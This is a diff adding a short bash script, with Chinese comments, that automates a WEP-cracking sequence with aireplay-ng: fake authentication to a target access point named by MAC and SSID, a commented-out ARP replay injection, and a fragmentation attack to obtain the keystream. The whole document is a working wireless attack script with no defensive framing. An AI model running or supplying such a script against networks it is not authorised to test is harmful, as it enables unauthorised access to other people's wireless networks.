@@ -1,0 +1,10 @@
+#!/bin/bash
+export mymac=00:18:1A:0C:39:AF 
+export apmac=$1
+export apname=$2 
+#握手
+aireplay-ng -1 0 -e $apname -a $apmac -h $mymac mon0
+wait
+#获取xor 
+#aireplay-ng -3 -b $apmac -h $mymac ‐x 1024 mon0 
+aireplay-ng -5 -b $apmac -h $mymac mon0
